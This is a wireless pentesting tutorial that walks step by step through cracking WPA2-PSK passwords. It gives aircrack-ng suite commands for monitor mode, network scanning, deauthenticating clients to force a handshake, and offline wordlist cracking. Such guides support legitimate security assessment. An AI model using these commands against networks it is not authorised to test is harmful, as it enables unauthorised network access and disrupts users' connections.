---
description: >-
  Insight into pentesting wireless networks - an assessment of wireless network
  password security. This attack will be easier if the network uses a weak
  password.
---

# Wireless Pentesting & Exploitation

## Prerequisites:

* WPA2 PSK: PSK means Pre-Shared Key. This is like a "personal" network - pretty much everyone uses it.&#x20;
* WPA2 Enterprise: used in more advanced environment (e.g., small, medium-sized businesses).
* Activities to perform include:

1. Evaluating strength of PSK.
2. Reviewing nearby networks.
3. Assessing guest networks.
4. Checking network access.&#x20;

***

## Overview of Steps:

1. Have our network card in monitor mode - this is a special mode where your NIC becomes a passive listener and captures raw packets instead of a normal WiFi client (this is called managed mode). If you were in managed mode, you wouldn't be able to capture handshakes and deauth attacks can't be performed.&#x20;
2. Discover information about the network (channel, BSSID (MAC address of the access point) etc.).
3. Select the network and capture data.
4. Perform deauth attack - deauthenticate a user from the network to force them to reauthenticate and cause a (WPA) handshake to happen to speed up the process of capturing a handshake.&#x20;
5. Capture the WPA handshake - this is where WPA2 PSK is vulnerable. We can take it offline and try to crack it (like a hash).&#x20;
6. Attempt to crack the handshake. If it's weak, it will be easy.&#x20;

***

## Method:

1. First, kill any processes that may interfere with the pentest using airmon-ng:

```shellscript
root@kali:~# airmon-ng check kill
```



2. Set up your NIC to be in monitor mode:

```shellscript
root@kali:~# airmon-ng start wlan0
```

-> Assumes wlan0 is the name of the wireless network interface the attacker's system is using. Change to match the name.



3. Double check this was done through this:

```shellscript
root@kali:~# iwconfig 
```



4. Find the wireless network to attack (SSID):

```shellscript
root@kali:~# airodump-ng wlan0mon
```

-> Scans the area for networks through your NIC.

-> Will list BSSIDs, PWR (powers - a smaller number signals a smaller physical distance away from the attacker's machine), SSIDs etc.,&#x20;



5. Capture information on a specific SSID and store it in a file like this:

```shellscript
root@kali:~# airodump-ng -c [WiFi Channel No.] --bssid [WiFi BSSID] -w [file] wlan0mon  
```

-> Specifying wlan0mon as the interface.&#x20;

-> You should get a list of station MAC addresses.

-> Wait in this console until you capture the handshake.



6. Deauth a station in a separate console (optional to speed up the process to get the user to log back in and capture information):

```shellscript
root@kali:~# aireplay-ng -0 1 -a [BSSID of AP] -c [Station MAC - found after 5.] wlan0mon
```

-> "-0" means deauth.

-> "1" means run this one time.&#x20;

-> Run this once per station in bursts to maximise your chances of capturing a handshake (become some users may not log back on, some may take a while to log back on, some will logon quickly etc.).

-> BSSID of Access Point stays the same because you're still just attacking the same AP. You're only changing the target station (user).



7. Now crack the handshake that was captured and stored in that file:

```shellscript
root@kali:~# aircrack-ng -w [Path to Wordlist] -b [AP MAC address] [capture file].cap
```

-> This will crack the WiFi password.&#x20;
